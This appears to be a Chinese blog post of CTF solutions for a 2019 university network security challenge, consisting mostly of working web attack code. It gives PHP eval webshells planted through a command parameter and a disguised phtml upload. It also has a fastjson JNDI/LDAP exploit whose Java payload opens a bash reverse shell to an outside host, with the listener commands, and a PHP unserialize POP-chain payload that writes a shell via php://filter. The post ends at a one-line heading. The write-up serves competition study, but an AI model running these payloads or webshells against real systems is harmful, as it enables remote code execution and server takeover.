@@ -1,0 +1,774 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.1">
+<meta name="baidu-site-verification" content="5ZQsOe30cm" />
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"southsea.st","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="这个幼儿园也太牛逼了。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2019 高校网络信息安全管理运维挑战赛 部分题解">
+<meta property="og:url" content="https://southsea.st/2019-EIS/index.html">
+<meta property="og:site_name" content="南溟丷">
+<meta property="og:description" content="这个幼儿园也太牛逼了。">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2019-11-21T00:00:00.000Z">
+<meta property="article:modified_time" content="2021-02-02T04:11:18.106Z">
+<meta property="article:author" content="南溟丷">
+<meta property="article:tag" content="Web">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="https://southsea.st/2019-EIS/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>2019 高校网络信息安全管理运维挑战赛 部分题解 | 南溟丷</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">南溟丷</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">我想在那里最蓝的大海扬帆</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://southsea.st/2019-EIS/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="南溟丷">
+      <meta itemprop="description" content="我想在那里最蓝的大海扬帆">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="南溟丷">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          2019 高校网络信息安全管理运维挑战赛 部分题解
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2019-11-21 00:00:00" itemprop="dateCreated datePublished" datetime="2019-11-21T00:00:00+00:00">2019-11-21</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E9%A2%98%E8%A7%A3/" itemprop="url" rel="index"><span itemprop="name">题解</span></a>
+                </span>
+            </span>
+
+          
+            <span id="/2019-EIS/" class="post-meta-item leancloud_visitors" data-flag-title="2019 高校网络信息安全管理运维挑战赛 部分题解" title="热度">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">热度：</span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <!--
+      <span class="post-meta-item-text">Valine：</span>
+      -->
+      <span class="post-meta-item-text">评论数：</span>
+    
+    <a title="valine" href="/2019-EIS/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2019-EIS/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>这个幼儿园也太牛逼了。</p>
+<a id="more"></a>
+
+<h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h3><h4 id="ezbypass"><a href="#ezbypass" class="headerlink" title="ezbypass"></a>ezbypass</h4><p>直接写个🐎。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?cmd&#x3D;file_put_contents(&quot;&#x2F;tmp&#x2F;south.php&quot;,&quot;&lt;?php eval(\$_POST[&#39;south&#39;]);?&gt;&quot;);</span><br></pre></td></tr></table></figure>
+
+<p>然后蚁剑右键绕过<strong>disable_function</strong>。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;bypass_disable_function_by_Nday_9e0c14fbba82b37&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="ezjava"><a href="#ezjava" class="headerlink" title="ezjava"></a>ezjava</h4><p>没啥好说的，<a href="https://github.com/CaijiOrz/fastjson-1.2.47-RCE" target="_blank" rel="noopener"><strong>fastjson-1.2.47-RCE</strong>漏洞复现</a>。</p>
+<p>修改<strong>Exploit.java</strong>。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exploit</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Exploit</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">"/bin/bash -c $@|bash 0 echo bash -i &gt;&amp;/dev/tcp/123.123.123.123/7777 0&gt;&amp;1"</span>);</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] argv)</span></span>&#123;</span><br><span class="line">        Exploit e = <span class="keyword">new</span> Exploit();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>编译后启用服务。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">java - marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http:&#x2F;&#x2F;123123123&#x2F;#Exploit</span><br><span class="line">python -m SimpleHTTPServer 80</span><br><span class="line">nc -lvvp 7777</span><br></pre></td></tr></table></figure>
+
+<p>然后发送<strong>Payload</strong>。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;ezjava&#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: 111.186.57.123:10301</span><br><span class="line">Content-Length: 193</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Origin: http:&#x2F;&#x2F;111.186.57.123:10301</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">DNT: 1</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_15_1) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;78.0.3904.108 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3</span><br><span class="line">Referer: http:&#x2F;&#x2F;111.186.57.123:10301&#x2F;ezjava&#x2F;</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br><span class="line">Cookie: PHPSESSID&#x3D;6074c295e31bd370d9c8839b0ea19491</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;:&#123;&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;&#125;,&quot;x&quot;:&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;ldap:&#x2F;&#x2F;123.123.123.123:1389&#x2F;Exploit&quot;,&quot;autoCommit&quot;:true&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>监听到反弹<strong>Shell</strong>。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;jndi_injection_by_ldap_3232&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="ezupload"><a href="#ezupload" class="headerlink" title="ezupload"></a>ezupload</h4><p>提示了<strong>login.php.swp</strong>，看了一下，发送空用户名不发送密码就可以绕过。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;111.186.57.61:10501&#x2F;</span><br><span class="line">username&#x3D;south</span><br></pre></td></tr></table></figure>
+
+<p>上🐴，修改文件头为<strong>GIF89a</strong>，后缀名为<strong>phtml</strong>。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;upload.php HTTP&#x2F;1.1</span><br><span class="line">Host: 111.186.57.123:10501</span><br><span class="line">Content-Length: 227</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Origin: http:&#x2F;&#x2F;111.186.57.123:10501</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">DNT: 1</span><br><span class="line">Content-Type: multipart&#x2F;form-data; boundary&#x3D;----WebKitFormBoundaryAJC3JWBX6v0GXTQe</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_15_1) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;78.0.3904.108 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3</span><br><span class="line">Referer: http:&#x2F;&#x2F;111.186.57.123:10501&#x2F;upload.php</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br><span class="line">Cookie: PHPSESSID&#x3D;6074c295e31bd370d9c8839b0ea19491</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryAJC3JWBX6v0GXTQe</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;avatar&quot;; filename&#x3D;&quot;south.phtml&quot;</span><br><span class="line">Content-Type: image&#x2F;jpeg</span><br><span class="line"></span><br><span class="line">GIF89a</span><br><span class="line">&lt;?php</span><br><span class="line">eval($_POST[&#39;south&#39;]);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryAJC3JWBX6v0GXTQe--</span><br></pre></td></tr></table></figure>
+
+<p>得到<strong>flag{logical_bypass_not_weak_password}</strong>。</p>
+<h4 id="ezpop"><a href="#ezpop" class="headerlink" title="ezpop"></a>ezpop</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> $store;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> $key;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> $expire;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($store, $key = <span class="string">'flysystem'</span>, $expire = null)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;key    = $key;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;store  = $store;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;expire = $expire;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">cleanContents</span><span class="params">(array $contents)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $cachedProperties = array_flip([</span><br><span class="line">            <span class="string">'path'</span>, <span class="string">'dirname'</span>, <span class="string">'basename'</span>, <span class="string">'extension'</span>, <span class="string">'filename'</span>,</span><br><span class="line">            <span class="string">'size'</span>, <span class="string">'mimetype'</span>, <span class="string">'visibility'</span>, <span class="string">'timestamp'</span>, <span class="string">'type'</span>,</span><br><span class="line">        ]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> ($contents <span class="keyword">as</span> $path =&gt; $object) &#123;</span><br><span class="line">            <span class="keyword">if</span> (is_array($object)) &#123;</span><br><span class="line">                $contents[$path] = array_intersect_key($object, $cachedProperties);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $contents;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getForStorage</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $cleaned = <span class="keyword">$this</span>-&gt;cleanContents(<span class="keyword">$this</span>-&gt;cache);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> json_encode([$cleaned, <span class="keyword">$this</span>-&gt;complete]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $contents = <span class="keyword">$this</span>-&gt;getForStorage();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;store-&gt;set(<span class="keyword">$this</span>-&gt;key, $contents, <span class="keyword">$this</span>-&gt;expire);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (! <span class="keyword">$this</span>-&gt;autosave) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;save();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getExpireTime</span><span class="params">($expire)</span>: <span class="title">int</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (int) $expire;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getCacheKey</span><span class="params">(string $name)</span>: <span class="title">string</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;options[<span class="string">'prefix'</span>] . $name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">serialize</span><span class="params">($data)</span>: <span class="title">string</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (is_numeric($data)) &#123;</span><br><span class="line">            <span class="keyword">return</span> (string) $data;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $serialize = <span class="keyword">$this</span>-&gt;options[<span class="string">'serialize'</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $serialize($data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">set</span><span class="params">($name, $value, $expire = null)</span>: <span class="title">bool</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;writeTimes++;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (is_null($expire)) &#123;</span><br><span class="line">            $expire = <span class="keyword">$this</span>-&gt;options[<span class="string">'expire'</span>];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $expire   = <span class="keyword">$this</span>-&gt;getExpireTime($expire);</span><br><span class="line">        $filename = <span class="keyword">$this</span>-&gt;getCacheKey($name);</span><br><span class="line"></span><br><span class="line">        $dir = dirname($filename);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!is_dir($dir)) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                mkdir($dir, <span class="number">0755</span>, <span class="keyword">true</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (\<span class="keyword">Exception</span> $e) &#123;</span><br><span class="line">                <span class="comment">// 创建失败</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $data = <span class="keyword">$this</span>-&gt;serialize($value);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;options[<span class="string">'data_compress'</span>] &amp;&amp; function_exists(<span class="string">'gzcompress'</span>)) &#123;</span><br><span class="line">            <span class="comment">//数据压缩</span></span><br><span class="line">            $data = gzcompress($data, <span class="number">3</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $data   = <span class="string">"&lt;?php\n//"</span> . sprintf(<span class="string">'%012d'</span>, $expire) . <span class="string">"\n exit();?&gt;\n"</span> . $data;</span><br><span class="line">        $result = file_put_contents($filename, $data);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ($result) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'src'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$dir = <span class="string">"uploads/"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!is_dir($dir))</span><br><span class="line">&#123;</span><br><span class="line">    mkdir($dir);</span><br><span class="line">&#125;</span><br><span class="line">unserialize($_GET[<span class="string">"data"</span>]);</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?src&#x3D;&amp;data&#x3D;O:1:&quot;A&quot;:4:&#123;s:8:&quot;*store&quot;;O:1:&quot;B&quot;:1:&#123;s:7:&quot;options&quot;;a:3:&#123;s:6:&quot;prefix&quot;;s:69:&quot;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base64-decode&#x2F;resource&#x3D;.&#x2F;uploads&#x2F;south.php&quot;;s:9:&quot;serialize&quot;;s:13:&quot;base64_decode&quot;;s:13:&quot;data_compress&quot;;i:0;&#125;&#125;s:6:&quot;*key&quot;;s:0:&quot;&quot;;s:9:&quot;*expire&quot;;i:1;s:5:&quot;cache&quot;;a:1:&#123;s:72:&quot;111111111111UEQ5d2FIQWdaWFpoYkNna1gxQlBVMVJiSjNOdmRYUm9KMTBwT3o4KzU1Q0E&#x3D;&quot;;a:0:&#123;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="ezwaf"><a href="#ezwaf" class="headerlink" title="ezwaf"></a>ezwaf</h4><p><strong>HTTP</strong>走私。</p>
